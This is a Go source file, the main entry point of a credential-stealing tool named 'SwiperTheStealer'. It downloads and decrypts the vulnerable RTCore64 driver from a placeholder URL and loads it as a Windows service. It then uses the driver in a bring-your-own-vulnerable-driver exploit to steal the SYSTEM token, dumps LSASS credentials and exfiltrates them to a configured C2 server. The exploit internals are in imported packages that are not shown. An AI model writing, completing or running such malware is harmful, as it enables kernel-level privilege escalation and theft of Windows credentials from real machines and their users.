package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"runtime"

	"swiper-the-stealer/internal/byovd"
	"swiper-the-stealer/internal/c2client"
	"swiper-the-stealer/internal/config"
	"swiper-the-stealer/internal/crypto"
	"swiper-the-stealer/internal/lsass"
	"swiper-the-stealer/internal/privesc"
	"swiper-the-stealer/internal/service"
	"swiper-the-stealer/pkg/logger"
)

const (
	AppVersion        = "2.0.0-Enhanced"
	AppName           = "SwiperTheStealer - Advanced BYOVD Credential Extraction Engine"
	DefaultConfigPath = "./config.json"
)

func main() {
	fmt.Printf("\n%s v%s\n", AppName, AppVersion)
	fmt.Println("Enhanced with Sophisticated Token Manipulation & RTCore BYOVD")
	fmt.Println("================================================")

	runtime.GOMAXPROCS(runtime.NumCPU())

	var configPath string
	flag.StringVar(&configPath, "config", DefaultConfigPath, "Path to configuration file")
	flag.Parse()

	// Initialize logger
	log := logger.NewLogger("info")
	log.Info("Initializing SwiperTheStealer with advanced capabilities")

	// Load configuration
	cfg, err := config.LoadConfig(configPath)
	if err != nil {
		log.Fatalf("Failed to load configuration: %v", err)
	}

	log.Info("Configuration loaded successfully")
	log.Info("Operating Mode: Enhanced BYOVD with Token Manipulation")

	// **PHASE 1: SOPHISTICATED DRIVER ACQUISITION & DEPLOYMENT**
	log.Info("Phase 1: Acquiring and deploying RTCore64 driver")

	driverPath := filepath.Join(".", "RTCore64.sys")

	// Check if driver exists, if not download and decrypt
	if _, err := os.Stat(driverPath); os.IsNotExist(err) {
		log.Info("Driver not found locally, attempting download and decryption")

		// Download and decrypt driver from remote location
		// Use a default URL if not configured
		driverURL := "http://example.com/encrypted_driver.bin"
		encryptionKey := "defaultkey123"

		err = crypto.DownloadAndDecryptDriver(driverURL, encryptionKey, driverPath)
		if err != nil {
			log.Fatalf("Failed to download and decrypt driver: %v", err)
		}

		log.Info("Driver successfully downloaded and decrypted")
	} else {
		log.Info("Using existing RTCore64.sys driver")
	}

	// Deploy driver as Windows service
	log.Info("Deploying RTCore64 driver as Windows service")
	err = service.RunDriverService(driverPath)
	if err != nil {
		log.Fatalf("Failed to deploy driver service: %v", err)
	}

	defer func() {
		log.Info("Cleaning up driver service")
		service.StopDriverService()
	}()

	// **PHASE 2: ENHANCED BYOVD INITIALIZATION**
	log.Info("Phase 2: Initializing enhanced BYOVD exploitation")

	// Initialize enhanced RTCore exploit
	exploit, err := byovd.NewRTCoreEnhancedExploit()
	if err != nil {
		log.Fatalf("Failed to initialize enhanced RTCore exploit: %v", err)
	}
	defer exploit.Close()

	log.Info("Enhanced RTCore exploit initialized successfully")

	// Get ntoskrnl.exe base address for kernel operations
	ntoskrnlBase, err := exploit.GetNtoskrnlBase()
	if err != nil {
		log.Fatalf("Failed to get ntoskrnl base address: %v", err)
	}

	log.Infof("Ntoskrnl base address: 0x%x", ntoskrnlBase)

	// **PHASE 3: SOPHISTICATED TOKEN MANIPULATION**
	log.Info("Phase 3: Performing sophisticated token manipulation")

	// Initialize sophisticated token stealer
	tokenStealer := privesc.NewSophisticatedTokenStealer(exploit)

	// Discover SYSTEM process and extract tokens
	err = tokenStealer.DiscoverSystemProcess()
	if err != nil {
		log.Fatalf("Failed to discover SYSTEM process: %v", err)
	}

	log.Info("SYSTEM process discovered successfully")

	// Discover dynamic offsets for token manipulation
	err = tokenStealer.DiscoverOffsets()
	if err != nil {
		log.Fatalf("Failed to discover token offsets: %v", err)
	}

	log.Info("Dynamic offsets discovered successfully")

	// Perform sophisticated token stealing
	err = tokenStealer.StealSystemToken()
	if err != nil {
		log.Fatalf("Failed to steal SYSTEM token: %v", err)
	}

	log.Info("SYSTEM token stolen and applied successfully")

	// **PHASE 4: ENHANCED LSASS CREDENTIAL EXTRACTION**
	log.Info("Phase 4: Enhanced LSASS credential extraction with elevated privileges")

	// Initialize enhanced LSASS dumper with new privileges
	dumper := lsass.NewSwiperTheStealer()

	// Extract credentials using enhanced methods
	credentials, err := dumper.ExtractCredentials()
	if err != nil {
		log.Fatalf("Failed to extract credentials: %v", err)
	}

	log.Infof("Credentials extracted successfully: %d entries found", len(credentials))

	// **PHASE 5: C2 COMMUNICATION**
	if cfg.C2.ServerURL != "" {
		log.Info("Phase 5: Establishing C2 communication")

		client := c2client.NewClient(cfg.C2.ServerURL)
		err = client.ExfiltrateCredentials(credentials)
		if err != nil {
			log.Errorf("Failed to exfiltrate credentials: %v", err)
		} else {
			log.Info("Credentials successfully exfiltrated to C2 server")
		}
	}

	log.Info("Operation completed successfully")
	log.Info("All phases executed with enhanced BYOVD capabilities")
	fmt.Println("================================================")
	fmt.Println("SwiperTheStealer execution completed successfully!")
}
